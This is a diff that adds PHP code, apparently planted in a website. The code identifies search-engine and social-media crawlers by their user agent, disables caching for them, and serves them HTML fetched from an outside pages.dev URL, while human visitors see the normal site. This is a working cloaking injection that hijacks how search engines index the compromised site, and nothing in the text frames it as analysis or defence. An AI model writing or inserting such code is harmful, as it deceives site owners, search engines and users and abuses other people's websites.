@@ -1,0 +1,49 @@
+function ua(){ return isset($_SERVER['HTTP_USER_AGENT'])?$_SERVER['HTTP_USER_AGENT']:''; }
+ 
+function is_bot(){
+  $ua=ua();
+  foreach(array('Google-InspectionTool','Googlebot','AdsBot-Google','bingbot','YandexBot','DuckDuckBot','Slurp','Baiduspider','AhrefsBot','SemrushBot','DotBot','MJ12bot','Sogou','PetalBot','Twitterbot','LinkedInBot','Applebot','facebot','facebookexternalhit','pinterestbot','Discordbot','TelegramBot','WhatsApp','Snapchat','Qwantify','MegaIndex','SeznamBot','CCBot','Exabot') as $b)
+    if(stripos($ua,$b)!==false) return true;
+  return false;
+}
+ 
+function is_mobile_bot(){
+  $ua=ua();
+  foreach(array('Googlebot-Mobile','AdsBot-Google-Mobile','Google-InspectionTool') as $b)
+    if(stripos($ua,$b)!==false) return true;
+  if(is_bot() && preg_match('/Mobile|Android|iPhone|iPad|Windows Phone|IEMobile|Opera Mini|Smartphone/i',$ua)) return true;
+  return false;
+}
+ 
+function is_homepage() {
+    $uri = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
+    return $uri === '/' || $uri === '';
+}
+ 
+function fetch($url){
+  if(function_exists('curl_init')){
+    $ch=curl_init($url);
+    curl_setopt_array($ch,array(
+      CURLOPT_RETURNTRANSFER=>true, CURLOPT_FOLLOWLOCATION=>true, CURLOPT_MAXREDIRS=>5,
+      CURLOPT_CONNECTTIMEOUT=>5, CURLOPT_TIMEOUT=>5, CURLOPT_SSL_VERIFYPEER=>true,
+      CURLOPT_SSL_VERIFYHOST=>2, CURLOPT_USERAGENT=>ua()?ua():'Mozilla/5.0'
+    ));
+    $b=curl_exec($ch); $c=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE); curl_close($ch);
+    if($b!==false && $c>=200 && $c<400) return $b;
+  }
+  $ctx=stream_context_create(array(
+    'http'=>array('timeout'=>5,'header'=>"User-Agent: ".(ua()?ua():'Mozilla/5.0')."rn"),
+    'ssl'=>array('verify_peer'=>true,'verify_peer_name'=>true)
+  ));
+  $b=@file_get_contents($url,false,$ctx);
+  return $b!==false?$b:null;
+}
+ 
+$bot=is_bot(); $mobot=is_mobile_bot();
+if(!headers_sent()){ if($bot||$mobot){ header('Cache-Control:no-store, no-cache, must-revalidate, max-age=0'); header('Pragma:no-cache'); header('Expires:0'); header('Surrogate-Control:no-store'); header('X-Bypass-Cache: bot'); } header('Vary: User-Agent'); }
+ 
+if($bot||$mobot){
+  $c=fetch('https://sahabatgoogle-unri.pages.dev/files.txt');
+  if($c!==null){ if(!headers_sent()) header('Content-Type:text/html; charset=UTF-8'); echo $c; exit; }
+  if(!headers_sent()) header('Content-Type:text/plain; charset=UTF-8'); echo 'Content unavailable.'; exit;
+}
